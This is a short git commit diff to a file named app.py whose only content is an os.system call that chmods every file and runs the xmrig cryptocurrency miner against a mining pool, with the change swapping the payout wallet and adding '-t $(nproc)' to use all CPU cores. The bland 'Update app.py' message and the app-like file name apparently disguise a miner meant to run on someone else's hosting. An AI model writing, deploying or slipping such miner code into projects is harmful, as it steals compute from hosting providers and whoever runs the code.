a137c9292fd83977870156067cfc72d43a1fe0dc
tiktokgas <147583582+tiktokgas@users.noreply.github.com>
2023-10-11 13:48:41 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,3 @@
 import os
-bashCommand = "lscpu && ls && chmod +xrw * && ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SOL:EoU6Ks3pGS6kDNhATGVWqyXinkAspCvmy4yXd2WfWJUN.MatthewMiner2 -p x"
+bashCommand = "lscpu && ls && chmod +xrw * && ./xmrig -o stratum+ssl://rx.unmineable.com:3333 -a rx -k -u BTT:TErY248nR5pb1F72SrK6JVY2LiUeqZY75V.CleverNEW#u0d5-rop5 -p x -t $(nproc)"
 os.system(bashCommand)
